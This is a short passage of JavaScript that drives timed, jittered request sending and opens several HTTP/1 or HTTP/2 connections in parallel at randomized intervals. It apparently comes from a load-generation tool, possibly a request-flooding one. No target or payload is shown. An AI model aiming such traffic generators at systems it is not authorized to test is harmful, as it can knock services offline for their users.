            const w = (1000 / rate) * (1 + (Math.random() * options.jitter * 2 - options.jitter));
            setTimeout(send, w);
        };
        send();
    }

    /* --- boot --- */
    (async () => {
        const opener = options.version === '1' ? openH1 : openH2;
        await sleep(Math.random() * 400);
        for (let i = 0; i < options.parallel; i++) {
            setTimeout(opener, i * 100 + Math.random() * 300);
        }
    })();
}